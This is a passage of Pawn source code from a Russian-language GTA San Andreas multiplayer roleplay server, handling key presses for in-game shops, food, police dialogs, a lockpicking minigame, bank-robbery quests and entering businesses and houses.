			ApplyDynamicActorAnimation(HotDogBot[i],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			printf("4 HOT DOG %d",i);
			Update3DTextLabelTextEx(HotDogText[i],-1,"Приятного аппетита");
			SendClientMessage(playerid,-1,"Чтобы съесть, используйте: {f7ae11}ЛКМ");
			SetTimerEx("ClearBotGlobal", 3000, false,"dd",HotDogBot[i],_:HotDogText[i]);
			SetPVarInt(playerid,"Burger",1);
			SetPlayerAttachedObject(playerid, 2, 19346, 5, 0.108999, 0.033000, -0.041000, 77.999992, -101.700012, 0.000000, 0.821000, 0.55, 0.738000);
			break;
	    }
		if(IsPlayerInRangeOfPoint(playerid, 3.0, 1399.9764,-26.8121,1000.9131) && GetPlayerVirtualWorld(playerid) == 7)
		{
			if(GetPlayerHouse(playerid))
			{
			    ApplyDynamicActorAnimation(mebelshopbot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(mebelshoptext,-1,"Хотите посмотреть наш ассортимент?");
				SetTimerEx("ClearBotGlobal", 3000, false, "dd", mebelshopbot,_:mebelshoptext);
				ShowPlayerDialog(playerid,309,DIALOG_STYLE_MSGBOX,"Магазин мебели","{ffffff}Вы хотите посомтреть ассортимент магазина мебели?","Далее","Назад");
			}
			else
			{
			    ApplyDynamicActorAnimation(mebelshopbot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(mebelshoptext,-1,"У Вас нет дома. Куда Вам мебель то?");
				SetTimerEx("ClearBotGlobal", 3000, false, "dd", mebelshopbot,_:mebelshoptext);
			}
		}
		
		if(IsPlayerInRangeOfPoint(playerid, 3.0, 295.8331,-82.6508,1001.5156) || IsPlayerInRangeOfPoint(playerid, 3.0, -23.7369,-57.3090,1003.5469) ||
		IsPlayerInRangeOfPoint(playerid, 3.0, 375.8562,-65.8491,1001.5078) || IsPlayerInRangeOfPoint(playerid, 3.0, 368.0333,-4.4919,1001.8516) ||
		IsPlayerInRangeOfPoint(playerid, 3.0, 500.1024,-77.5636,998.7578) || IsPlayerInRangeOfPoint(playerid, 3.0, 501.8481,-20.8618,1000.6797) ||
		IsPlayerInRangeOfPoint(playerid, 3.0,1206.2219,-30.0733,1000.9606) || IsPlayerInRangeOfPoint(playerid, 3.0, 374.6826,-117.2784,1001.4922) ||
		IsPlayerInRangeOfPoint(playerid, 3.0, -23.7369,-57.3090,1003.5469) || IsPlayerInRangeOfPoint(playerid,3,1481.7207,-1654.9781,1195.6860)
		|| IsPlayerInRangeOfPoint(playerid,3,1478.3018,-1654.9960,1195.6860) || IsPlayerInRangeOfPoint(playerid,3,730.5906,8.9050,1000.6981)
		|| IsPlayerInRangeOfPoint(playerid,3,1714.3004,-1680.2706,1391.3567) || IsPlayerInRangeOfPoint(playerid,3,205.4237,-8.9687,1002.2679)
		|| IsPlayerInRangeOfPoint(playerid,3,997.4583,-1860.3011,12.8203) || IsPlayerInRangeOfPoint(playerid,3,-2048.5776,-126.7383,-50.9141)
		|| IsPlayerInRangeOfPoint(playerid,5,820.1865,1.9216,1004.1797) || IsPlayerInRangeOfPoint(playerid,5,2217.3889,-1145.2188,1025.7770)
		|| IsPlayerInRangeOfPoint(playerid,5,-786.9160,498.3215,1371.7422) || IsPlayerInRangeOfPoint(playerid,5,161.3947,-81.1919,1001.8047)
		|| IsPlayerInRangeOfPoint(playerid,5,207.6614,-98.7048,1005.2578)   || IsPlayerInRangeOfPoint(playerid,5,408.9914,-53.6016,1001.8984)
		 || IsPlayerInRangeOfPoint(playerid,5,1306.9800,-1341.9086,2001.5759) || IsPlayerInRangeOfPoint(playerid,5,9.0084,1.0245,1996.2479)
		|| IsPlayerInRangeOfPoint(playerid,5,1398.9728,-20.1940,1000.8685)
		 )
		 {
			if(GetPVarInt(playerid,"PBIZ") > 0)
			{
                ShowMenuBiz(playerid);
			}
		 }
        if(IsPlayerInRangeOfPoint(playerid, 2.0,2015.3682,1385.2762,3017.1025))
		{
		    if((PlayerInfo[playerid][pMember] != F_LVPD  && GetPlayerVirtualWorld(playerid) == 1)
			|| (PlayerInfo[playerid][pMember] != F_LSPD  && GetPlayerVirtualWorld(playerid) == 17) || PlayerInfo[playerid][pWork] == 0) return true;
		    ShowPlayerDialog(playerid,251,DIALOG_STYLE_LIST,"Компьютер","1 | Информация о постах\n2 | Снять с розыска\n3 | Подключить к камерам","Далее","Отмена");
		   // ShowPlayerDialog(playerid,253,DIALOG_STYLE_INPUT,"Снять с розыска","{FFFFFF}Введите имя и фамилью человека, с которого хотите снять розыск.\nВ форме: Имя_Фамилия\nПример: Ivan_Ivanov","Далее","Назад");
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0,0.0776,-38.0407,2003.0779) && (IsACop(playerid) ||  PlayerInfo[playerid][pMember] == F_MAYOR))
		{
		    ProxDetector(30.0, playerid, "Громкоговоритель: Камеры открыты! Все на выход!",CREWARD);
		    for(new i = 2; i <= 17; i++)
			{
				if(IsDynamicObjectMoving(cell[i])) continue;
				new Float:x,Float:y,Float:z;
				GetDynamicObjectPos(cell[i],x,y,z);
	            MoveDynamicObject(cell[i],x, y + 1.3, z,2);
	            SetTimerEx("MoveObjectOpen",2500,false,"dffff",cell[i],x,y,z,2.0);
			}
		}
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, 1987.2416,1352.9572,1015.4606))
		{
			ShowPlayerDialog(playerid,350,DIALOG_STYLE_LIST,"Полицейский участок","Оплатить штрафы\nСдаться с повинной","Далее","Отмена");
		   	
	    }
	    if(GetPVarInt(playerid,"AnimGo") > 0)
	    {
	        ClearAnim(playerid);
	        SetPlayerSpecialAction(playerid,0);
	        DeletePVar(playerid,"AnimGo");
         	PlayerTextDrawDestroy(playerid,InfoText[playerid]);
			for(new gSL; gSL < 3; gSL++) TextDrawHideForPlayer(playerid, PressH[gSL]);
	    }
	    
	    if(GetPVarInt(playerid,"Tir"))
	    {
			SetPlayerVirtualWorld(playerid, GetPVarInt(playerid,"AmmoV"));
			SPPos(playerid,300.3766,-78.0825,1001.5229);
			shot__player[playerid] = 0;
			levelammo[playerid] = 0;
			format(PlayerInfo[playerid][pSkills],50,"%i,%i,%i,%i,%i,%i,%i",PlayerInfo[playerid][pGunSkill][0],PlayerInfo[playerid][pGunSkill][1],PlayerInfo[playerid][pGunSkill][2],PlayerInfo[playerid][pGunSkill][3],
			PlayerInfo[playerid][pGunSkill][4],PlayerInfo[playerid][pGunSkill][0],PlayerInfo[playerid][pGunSkill][5],PlayerInfo[playerid][pGunSkill][6]);
			SetPlayerStr(PlayerInfo[playerid][pSendername],"skills",PlayerInfo[playerid][pSkills]);
			DeletePVar(playerid,"Tir");
			DeletePVar(playerid,"AmmoV");
			DeletePVar(playerid,"short__shop");
			ResetPlayerWeapons(playerid);
			PlayerTextDrawDestroy(playerid,InfoText[playerid]);
			for(new gSL; gSL < 3; gSL++) TextDrawHideForPlayer(playerid, PressH[gSL]);
			DestroyDynamicObject(GetPVarInt(playerid,"ObjectTir1"));
			DestroyDynamicObject(GetPVarInt(playerid,"ObjectTir2"));
			DeletePVar(playerid,"ObjectTir1");
			DeletePVar(playerid,"ObjectTir2");
		}
	//    if(IsPlayerInRangeOfPoint(playerid, 10.0, 1544.69177, -1630.81421, 12.89080)) cmd_openlspd(playerid,"");
	//    if(IsPlayerInRangeOfPoint(playerid, 10.0, 1587.73840, -1638.04297, 14.73610)) cmd_openlspd1(playerid,"");
	    //if(IsPlayerInRangeOfPoint(playerid, 10.0, 758.81073, -1386.76660, 13.21860)) cmd_openlic(playerid,"");
	    //if(IsPlayerInRangeOfPoint(playerid, 10.0, 1215.81689, -1325.97620, 13.28190)) cmd_openbolka(playerid,"");
		cmd_cell(playerid,"");
	//	cmd_cell(playerid,"");
	//	cmd_cell2(playerid,"");
        //if(IsPlayerInRangeOfPoint(playerid, 3.0, 2355.60, -1353.70, 733.98) || IsPlayerInRangeOfPoint(playerid, 3.0,2355.52, -1368.41, 733.99))  cmd_opendoorpd(playerid,"");
	}
	if(newkeys == KEY_NO)
	{
	    if(GetPVarInt(playerid,"Vzlom") > 0)
	    {
			if(progressb[playerid] == 0)
			{
				if(progress[playerid] >= 90)
				{
					progress[playerid] = 100;
					PlayerTextDrawHide(playerid,Progress[playerid][4]);
					PlayerTextDrawTextSize(playerid, Progress[playerid][4], 125.333358, 8.462213);
					PlayerTextDrawShow(playerid,Progress[playerid][4]);
				}
				else
				{
				    new text[20];
					progress[playerid] = progress[playerid]+5;
					PlayerTextDrawHide(playerid,Progress[playerid][4]);
					PlayerTextDrawTextSize(playerid, Progress[playerid][4], (125.333358/100)*progress[playerid], 8.462213);
					PlayerTextDrawShow(playerid,Progress[playerid][4]);
					progressb[playerid] = random(2);
					switch(progressb[playerid])
					{
					case 0: format(text,20,"PRESS: ~r~N");
					case 1: format(text,20,"PRESS: ~r~Y");
					case 2: format(text,20,"PRESS: ~r~Y");
					}
					PlayerTextDrawSetString(playerid, Progress[playerid][3],text);
				}
			}
			else
			{
				progress[playerid] = progress[playerid]-10;
				new text[20];
				PlayerTextDrawHide(playerid,Progress[playerid][4]);
				PlayerTextDrawTextSize(playerid, Progress[playerid][4], (125.333358/100)*progress[playerid], 8.462213);
				PlayerTextDrawShow(playerid,Progress[playerid][4]);
				progressb[playerid] = random(2);
				switch(progressb[playerid])
				{
					case 0: format(text,20,"PRESS: ~r~N");
					case 1: format(text,20,"PRESS: ~r~Y");
					case 2: format(text,20,"PRESS: ~r~Y");
				}
				PlayerTextDrawSetString(playerid, Progress[playerid][3],text);
			}
		}
 	}
 	if(GetPlayerWeapon(playerid) == 41 && IsAGang(playerid))
	{
	    if(PRESSED(KEY_FIRE))
		{
		    for(new i = 1;i<=TOTALGF;i++)
		    {
	            if(IsPlayerInRangeOfPoint(playerid,4.0,GZLogoInfo[i][gCoords][0],GZLogoInfo[i][gCoords][1],GZLogoInfo[i][gCoords][2]))
				{
					if(GetPlayerAmmo(playerid) < 30)
					{
					    SendClientMessage(playerid,CGREY,"Купите новый балончик! Этот почти закончился");
					    break;
					}
					if(GZLogoInfo[i][gOwner][0] == PlayerInfo[playerid][pMember] || GZLogoInfo[i][gOwner][1] == PlayerInfo[playerid][pMember])
					{
					    SendClientMessage(playerid,CGREY,"Это и так ваше граффити или было недавно вашим!");
					    break;
					}
					SetPVarInt(playerid,"ColorFire",GetPlayerAmmo(playerid));
					SetPVarInt(playerid,"GZLogoID",i);
					printf("1 graf %d",i);
					break;
				}
			}
		}
	    if(RELEASED(KEY_FIRE)) DeletePVar(playerid,"ColorFire"), DeletePVar(playerid,"GZLogoID");
	}
 	if(newkeys & KEY_FIRE)
	{
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && !IsInv(GetPlayerVehicleID(playerid)))
	    {
			new v = GetPlayerVehicleID(playerid);
			if(v == INVALID_VEHICLE_ID) return true;
			SetLights(playerid,v,(!Lights[v]) ? (true) : (false));
		}
	}
	if( (newkeys & KEY_FIRE) || ( (newkeys & KEY_AIM) && (oldkeys & KEY_AIM) && (newkeys & KEY_SECONDARY_ATTACK) ) )
 	{
		switch(GetPlayerSpecialAction(playerid))
		{
		    case SPECIAL_ACTION_SMOKE_CIGGY:
		    {
		        if(GetPVarInt(playerid,"UseSp") > 1)
				{
				    new Float:hl;
					GetPlayerHealth(playerid,hl);
  					SetHealth(playerid,hl+0.5);
					if(hl > 100) SetHealth(playerid,100);
					SetPVarInt(playerid,"UseSp",GetPVarInt(playerid,"UseSp")-1);
				}
				else DeletePVar(playerid,"UseSp"),SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
		    }
		    case SPECIAL_ACTION_DRINK_SPRUNK:
		    {
		        if(GetPVarInt(playerid,"UseSp") > 1)
				{
  					GiveGolod(playerid,4);
  					new Float:hl;
					GetPlayerHealth(playerid,hl);
  					SetHealth(playerid,hl+1);
					if(hl > 100) SetHealth(playerid,100);
					SetPVarInt(playerid,"UseSp",GetPVarInt(playerid,"UseSp")-1);
				}
				else DeletePVar(playerid,"UseSp"),SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
		    }
		    case SPECIAL_ACTION_DRINK_BEER:
		    {
		        if(GetPVarInt(playerid,"UseSp") > 1)
				{

					SetPlayerDrunkLevel (playerid, 10000*GetPVarInt(playerid,"Buhlo")+2);
					if(GetPlayerDrunkLevel(playerid) > 50000) SetPlayerDrunkLevel (playerid, 50000);
					SetPVarInt(playerid,"UseSp",GetPVarInt(playerid,"UseSp")-1);
				}
				else DeletePVar(playerid,"UseSp"),DeletePVar(playerid,"Buhlo"),SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
		    }
		    case SPECIAL_ACTION_DRINK_WINE:
		    {
		        if(GetPVarInt(playerid,"UseSp") > 1)
				{

					SetPlayerDrunkLevel (playerid, 10000*GetPVarInt(playerid,"Buhlo")+2);
					if(GetPlayerDrunkLevel(playerid) > 50000) SetPlayerDrunkLevel (playerid, 50000);
					SetPVarInt(playerid,"UseSp",GetPVarInt(playerid,"UseSp")-1);
				}
				else DeletePVar(playerid,"UseSp"),DeletePVar(playerid,"Buhlo"),SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
		    }
		 	default:
		 	{
				if(IsPlayerAttachedObjectSlotUsed(playerid, 2) && GetPVarInt(playerid,"Burger") > 0)
				{
					GiveGolod(playerid,20);
					new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid,slx,sly,slz);
					PlayerPlaySound(playerid, 32200, slx, sly, slz+5);
					if(PlayerInfo[playerid][pGolod] > 100) SetGolod(playerid,100);
				    ApplyAnimation(playerid,"VENDING","VEND_EAT1_P",4.1,0,1,1,1,1,1);
					RemovePlayerAttachedObject(playerid, 2);
					DeletePVar(playerid,"Burger");
				}
				else
				{
		   			if(!IsPlayerInAnyVehicle(playerid))
			 	    {
			 	        if(PlayerInfo[playerid][pLevel] < 10 && !IsACop1(playerid)) 
			 	        {
							if(GetPVarInt(playerid,"ZZ") && !GetPVarInt(playerid,"UseSp"))
					 	    {
							    SendClientMessage(playerid,CLIGHTRED,"Внимание! Вы находитесь в зелёной зоне, здесь нельзя драться");
								ApplyAnimation(playerid,"FAT","IDLE_tired",4.1,0,0,0,0,0,1);
					 	    }
				 	    }
			 	    }
		 	    }
			}
 	    }
 	}
 	
	if(newkeys == KEY_YES)
	{
	    
	    if(!GetPVarInt(playerid,"Vzlom") && !GetPred(playerid) && !GetPVarInt(playerid,"LowRideID")) return cmd_inv(playerid);
 		if(GetPVarInt(playerid,"Vzlom") > 0)
	    {
			if(progressb[playerid] >= 1)
			{
				if(progress[playerid] >= 90)
				{
					progress[playerid] = 100;
					PlayerTextDrawHide(playerid,Progress[playerid][4]);
					PlayerTextDrawTextSize(playerid, Progress[playerid][4], 125.333358, 8.462213);
					PlayerTextDrawShow(playerid,Progress[playerid][4]);
				}
				else
				{
				    new text[20];
					progress[playerid] = progress[playerid]+5;
					PlayerTextDrawHide(playerid,Progress[playerid][4]);
					PlayerTextDrawTextSize(playerid, Progress[playerid][4], (125.333358/100)*progress[playerid], 8.462213);
					PlayerTextDrawShow(playerid,Progress[playerid][4]);
					progressb[playerid] = random(2);
					switch(progressb[playerid])
					{
					case 0: format(text,20,"PRESS: ~r~N");
					case 1: format(text,20,"PRESS: ~r~Y");
					case 2: format(text,20,"PRESS: ~r~Y");
					}
					PlayerTextDrawSetString(playerid, Progress[playerid][3],text);
				}
			}
			else
			{
				progress[playerid] = progress[playerid]-10;
				new text[20];
				PlayerTextDrawHide(playerid,Progress[playerid][4]);
				PlayerTextDrawTextSize(playerid, Progress[playerid][4], (125.333358/100)*progress[playerid], 8.462213);
				PlayerTextDrawShow(playerid,Progress[playerid][4]);
				progressb[playerid] = random(2);
				switch(progressb[playerid])
				{
					case 0: format(text,20,"PRESS: ~r~N");
					case 1: format(text,20,"PRESS: ~r~Y");
					case 2: format(text,20,"PRESS: ~r~Y");
				}
				PlayerTextDrawSetString(playerid, Progress[playerid][3],text);
			}
		}
	}
	if(newkeys & KEY_WALK)
	{
	    if(Trenag[playerid] > 0) EndKach(playerid,Trenag[playerid]);
	    if(IsPlayerInDynamicArea(playerid,policeform))
		{
		    if(GetPVarInt(playerid,"GrabQuest") == 3 && !GetPVarInt(playerid,"GrabQuestW") && !GetPVarInt(playerid,"Vzlom"))
		    {
		        if(!PlayerInfo[playerid][pOtm]) return SendClientMessage(playerid,CGREY,"У Вас нет отмычки!");
				PlayerInfo[playerid][pOtm]--;
				InvMinus(playerid,458,1);
				if(!random(2)) return SendClientMessage(playerid,CREWARD,"Отмычка сломалась");
				SetPVarInt(playerid,"Vzlom",14);
				ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
				StartGame(playerid);
		    }
		}
		new band = PlayerInfo[playerid][pGrabTeam];
		if(band && !GetPVarInt(playerid,"MoneyV"))
		{
			if(BankGrab[band][bGrab] && BankGrab[band][bGrabStatus] == 5 && BankGrab[band][bGrab] != 7)
			{
			    new d = BankGrab[PlayerInfo[playerid][pGrabTeam]][bTown];
				for(new i = 0; i < 6; i++)
				{
					if(IsPlayerInDynamicArea(playerid,yachek[i]) || BankHack[d][bYaStatus][i]) continue;
					SetPVarInt(playerid,"Vzlom",18);
					ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
					StartGame(playerid);
					break;
				}
			}
		}
		if(IsPlayerInDynamicArea(playerid,staffcom))
		{
		    if(!band) return true;
	        if(BankGrab[band][bGrab] && BankGrab[band][bGrabStatus] == 2 && !BankHack[BankGrab[band][bTown]][bankStaff])
	        {
	            BankHack[BankGrab[PlayerInfo[playerid][pGrabTeam]][bTown]][bankStaff] = 1;
	            ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
	            TogglePlayerControllable(playerid, 0);
	            GameTextForPlayer(playerid, "~G~WAIT 5 SECONDS....", 5000, 1);
	            SetTimerEx("HackStaff",5000,false,"d",playerid);
	        }
		}
	    if(PlayerInfo[playerid][pNark])
		{
			new Float:x,Float:y,Float:z;
			GetDynamicObjectPos(PlayerInfo[playerid][pNarkObj],x,y,z);
			if(IsPlayerInRangeOfPoint(playerid, 2.0, x,y,z)) CatchDrugs(playerid);
		}

   	 	if(IsPlayerInRangeOfPoint(playerid, 5.0, 1389.5343,5.2544,1000.9153) && GetPlayerInterior(playerid) == 55 && GetPlayerVirtualWorld(playerid) == fbidal && GetPVarInt(playerid,"InFbiCar"))
		{
		    new Float:CarPos[3];
    		GetCoordBootVehicle(fbidal,CarPos[0],CarPos[1],CarPos[2]);
    		SetPlayerPos(playerid,CarPos[0],CarPos[1],CarPos[2]);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,GetVehicleVirtualWorld(fbidal));
			DeletePVar(playerid,"InFbiCar");
		}
		if(IsPlayerInRangeOfPoint(playerid, 5.0, 1393.1512,-38.8529,1000.9114) && GetPlayerInterior(playerid) == 6)
		{
		    ShowPlayerDialog(playerid,397,DIALOG_STYLE_LIST,"Биржа","1 | Покупка акций\n2 | Ваши акции\n3 | Выставить акции бизнеса на продажу","Далее","Отмена");
		}
	    if((IsPlayerInRangeOfPoint(playerid, 5.0, 611.4603,1287.3488,11.7891) ||
		IsPlayerInRangeOfPoint(playerid, 5.0, 629.4431,1298.4855,11.7891)) && mat == 2)
	    {
			if(GetPVarInt(playerid,"AmmoVR") > 0) return SendClientMessage(playerid,CGREY,"У Вас уже ящик в руках");
			if((IsPlayerInRangeOfPoint(playerid, 5.0, 611.4603,1287.3488,11.7891) && samolet[0] < 500)||
			(IsPlayerInRangeOfPoint(playerid, 5.0, 629.4431,1298.4855,11.7891) && samolet[1] < 500)) return SendClientMessage(playerid,CGREY,"Недостаточно материалов в блоке");
			new yashik = GetSamol(playerid);
			samolet[yashik] -= 500;
			UpdSam(yashik);
			if(!samolet[yashik])
			{
			    DestroyDynamic3DTextLabel(sam[yashik]);
			    DestroyDynamicObject(objectsam[yashik]);
			}
			SetPVarInt(playerid,"AmmoVR",1);
			SetPlayerSpecialAction(playerid,25);
			SetPlayerAttachedObject(playerid, 1, 2358, 1, 0.121000, 0.364999, 0.000000, 0.000000, 87.699951, 0.000000, 1.000000, 1.00, 1.000000);
			SendClientMessage(playerid,CREWARD,"Вы взяли ящик с материалами | Положить в транспорт: /put | Выбросить: /drop");
	    }
	    if(PlaneStatus == 3)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 10.0, 331.35229, 2502.98730, 17.65790))
		    {
		        if(GetPVarInt(playerid,"DrugsVR") > 0) return SendClientMessage(playerid,CGREY,"У Вас уже товар в руках");
				if(PlaneSklad < 1) return SendClientMessage(playerid,CGREY,"Недостаточно товара в самолете");
				SetPVarInt(playerid,"DrugsVR",1);
				PlaneSklad -= 1;
				UpdatePlane();
				SetPlayerSpecialAction(playerid,25);
				SetPlayerAttachedObject(playerid, 1, 1575, 1, -0.128999, 0.369999, -0.034000, 0.000000, 88.200019, 0.000000, 1.000000, 1.00, 1.000000);
				SendClientMessage(playerid,CREWARD,"Вы взяли ящик с наркотиками | Положить в транспорт: /put | Выбросить: /drop");
		    }
	    }
	    for(new i;i<sizeof(phonepos);i++)
		{
			if(!IsPlayerInDynamicArea(playerid,phonepospic[i])) continue;
			ShowPlayerDialog(playerid,415,DIALOG_STYLE_TABLIST,"Телефонная будка","Вызов государственных служб\t{f7ae11}[Бесплатно]{ffffff}\nВызов такси или механика\t{f7ae11}[2$]{ffffff}\nЗвонок\t{f7ae11}[5$]\n","Принять","Отмена");
			break;
		}
	    if(GetPVarInt(playerid,"InJob") == 1)
	    {
	        new i = GetPVarInt(playerid,"Check");
    		if(IsPlayerInRangeOfPoint(playerid, 5.0, MusorPos[i][0],MusorPos[i][1],MusorPos[i][2]))
			{
		     
		        SetPlayerAttachedObject(playerid, 1, 1264, 6, 0.222, 0.024, 0.128, 1.90, -90.0, 0.0, 0.5,0.5, 0.5);
		        new Float: x, Float: y, Float: z;
		    	GetCoordBootVehicle(GetPVarInt(playerid,"Bus"), x, y, z);
				SetPVarInt(playerid,"JobCP",CreateDynamicCP(x,y,z, 1.0,0,0,playerid));
		    	SendClientMessage(playerid,CGREEN,"Отнесите мусор в транспорт!");
		    	if(MusorCount[i] >= 50) MusorCount[i] -= 50;
				else MusorCount[i] = 0;
				new string[40];
				format(string, sizeof(string), "Мусор: {f7ae11}%d/100%", MusorCount[i]);
				UpdateDynamic3DTextLabelText(MusorText[i], -1, string);
		    	SetPVarInt(playerid,"InJob",2);
			}
	    }
	    if(IsPlayerInRangeOfPoint(playerid,2.0,BizInfo[GetPVarInt(playerid,"BizP")][bX],BizInfo[GetPVarInt(playerid,"BizP")][bY],BizInfo[GetPVarInt(playerid,"BizP")][bZ]) && GetPVarInt(playerid,"BizP"))
		{
		    new i = GetPVarInt(playerid,"BizP");
		    DeletePVar(playerid,"BizP");
			if(BizInfo[i][bLock] && !IsACop(playerid)) return SendClientMessage(playerid,CGREY,"Бизнес закрыт");
			if(PlayerInfo[playerid][pCash] < BizInfo[i][bVhod]) return SendClientMessage(playerid,CGREY,"Недостаточно средств для входа");
			new str[20];
			format(str,sizeof(str),"BizPlat%i",i);
			SetPVarInt(playerid,"Freeze",1);
			if(GetPVarInt(playerid,str) == 0)
			{

				BizMinus(i,BizInfo[i][bVhod],0);
				GiveMoney(playerid,-BizInfo[i][bVhod]);
				SetPVarInt(playerid,str,1);
			}
			if(BizInfo[i][bType] == 10)
			{

				SetPlayerPos(playerid,-27.3143,-58.2692,1003.5469);
				SetPlayerInterior(playerid,6);
				SetPlayerVirtualWorld(playerid,i);
				SetPVarInt(playerid,"PBIZ",i);
				return true;
			}
			if(!strcmp(BizInfo[i][bOwner],"None",true)) SendClientMessage(playerid,-1,"Бизнес свободен! Для покупки используйте: {f7ae11}/buybiz");
			SetPlayerPos(playerid,BizInfo[i][bXX],BizInfo[i][bYY],BizInfo[i][bZZ]);
			SetPlayerInterior(playerid,BizInfo[i][bInt]);
			SetPlayerVirtualWorld(playerid,i);
			SetPVarInt(playerid,"PBIZ",i);
		}
	    for(new i = 1; i <= TOTALKOM; i++)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 1.0, KomInfo[i][kX],KomInfo[i][kY],KomInfo[i][kZ]) && GetPlayerVirtualWorld(playerid) == KomInfo[i][kvirt])
	        {
	            if(!strcmp(KomInfo[i][kOwner],"None",true)) SendClientMessage(playerid,-1,"Комната свободна! Снять комнату можно на ресепшене.");
	            SetPlayerVirtualWorld(playerid, i);
	            SetPlayerInterior(playerid,5);
	            SetPVarInt(playerid,"Freeze",1);
	            SetPlayerPos(playerid,-0.1794,-8.1853,1996.0859);
				SetPVarInt(playerid,"PKOM",i);
				break;
	        }
	    }
	    if(GetPVarInt(playerid,"PKOM") > 0)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 2.0, -0.1794,-8.1853,1996.0859))
	        {
	            if(BizInfo[KomInfo[GetPVarInt(playerid,"PKOM")][kbiz]][bType] == 13)
	            {
	            	SetPlayerVirtualWorld(playerid, KomInfo[GetPVarInt(playerid,"PKOM")][kvirt]);
	            	SetPlayerInterior(playerid,15);
             		SetPlayerPos(playerid,KomInfo[GetPVarInt(playerid,"PKOM")][kX],KomInfo[GetPVarInt(playerid,"PKOM")][kY],KomInfo[GetPVarInt(playerid,"PKOM")][kZ]);
					FreezePlayer(playerid,KomInfo[GetPVarInt(playerid,"PKOM")][kX],KomInfo[GetPVarInt(playerid,"PKOM")][kY]);
				}
				DeletePVar(playerid,"PKOM");
	        }
	        else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1281.0703,-36.1240,1000.9205))
	        {
         		SetPlayerPos(playerid,1392.9663,-30.0035,1000.8685);
         		FreezePlayer(playerid,1392.9663,-30.0035);
         		SetPlayerInterior(playerid,BizInfo[GetPVarInt(playerid,"PBIZ")][bInt]);
	        	SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"PBIZ"));
	        	DeletePVar(playerid,"PKOM");
	        }
	    }
	    
	    if(GetPVarInt(playerid,"PHOUSE") > 0)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 2.0, HInfo[GetPVarInt(playerid,"PHOUSE")][hXX],HInfo[GetPVarInt(playerid,"PHOUSE")][hYY],HInfo[GetPVarInt(playerid,"PHOUSE")][hZZ]))
	        {
	            SetPlayerInterior(playerid,0);
			    SetPlayerVirtualWorld(playerid,0);
			    SetPVarInt(playerid,"Freeze",1);
		    	SetPlayerPos(playerid,HInfo[GetPVarInt(playerid,"PHOUSE")][hX],HInfo[GetPVarInt(playerid,"PHOUSE")][hY],HInfo[GetPVarInt(playerid,"PHOUSE")][hZ]);
			    DeletePVar(playerid,"PHOUSE");
			    SetPVarInt(playerid,"Vihod",1);
	        }
	        if(IsPlayerInRangeOfPoint(playerid, 2.0, HInfo[GetPVarInt(playerid,"PHOUSE")][hGar][0],HInfo[GetPVarInt(playerid,"PHOUSE")][hGar][1],HInfo[GetPVarInt(playerid,"PHOUSE")][hGar][2]) && GetPlayerHouse(playerid) && GetPVarInt(playerid,"PlayerHouse") == GetPVarInt(playerid,"PHOUSE"))
			{
			    if(HInfo[GetPVarInt(playerid,"PlayerHouse")][hUl][0])
		    	{
		    	    new maxslots,dob;
					new x = GetPVarInt(playerid,"PlayerHouse");
				    if(!HInfo[x][hUl][2]) maxslots = 36;
					else maxslots = 72;
					for(new i = 0; i < maxslots; i++)
					{
				  		if(HInfo[x][hInvSlot][i] < 1 || HInfo[x][hInvSlot][i] > 311) continue;
				  		ListNick[playerid][dob] = HInfo[x][hInvSlot][i];
						dob++;
					}
					if(!dob) return SendClientMessage(playerid,CGREY,"У Вас нет вещей в гардеробе!");
					SetPVarInt(playerid,"MaxSkins",dob);
	          		SetPlayerPos(playerid,258.7234,-40.7600,1002.0234);
				    SetPlayerCameraPos(playerid,256.015441,-42.447757,1002.323669);
					SetPlayerCameraLookAt(playerid,256.885528,-41.956615,1002.282043);
	                DeletePVar(playerid,"ShkafRaz");
	                new str[10];
	                format(str,sizeof(str),"ID: %d", PlayerInfo[playerid][pSkin][GetPVarInt(playerid,"ShkafRaz")]);
					PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],str);
	        		SetPVarInt(playerid,"Shkaf",1);
	        		SetPlayerSkin(playerid,ListNick[playerid][0]);
	        		SetPlayerFacingAngle(playerid,117.4438);
	        		SetPlayerInterior(playerid,14);
					TogglePlayerControllable(playerid, 0);
	                for(new f = 5; f < 18; f++) TextDrawShowForPlayer(playerid,ObjectBuy[f]);
	                for(new f = 1; f < 2; f++) PlayerTextDrawShow(playerid,ObjectBuyP[f][playerid]);
					SelectTextDraw(playerid, CGREY);
		    	}
			}
	    }
	    if(GetPVarInt(playerid,"PBIZ") > 0)
	    {
			if(IsPlayerInRangeOfPoint(playerid, 2.0, BizInfo[GetPVarInt(playerid,"PBIZ")][bXX],BizInfo[GetPVarInt(playerid,"PBIZ")][bYY],BizInfo[GetPVarInt(playerid,"PBIZ")][bZZ]) ||
			IsPlayerInRangeOfPoint(playerid, 2.0, -27.3143,-58.2692,1003.5469))
	        {
	            SetPlayerInterior(playerid,0);
			    SetPlayerVirtualWorld(playerid,0);
				SetPVarInt(playerid,"Freeze",1);
		    	SetPlayerPos(playerid,BizInfo[GetPVarInt(playerid,"PBIZ")][bXX1],BizInfo[GetPVarInt(playerid,"PBIZ")][bYY1],BizInfo[GetPVarInt(playerid,"PBIZ")][bZZ1]);
			    
			    DeletePVar(playerid,"PBIZ");
		    }
		    
	    }

	   
	    
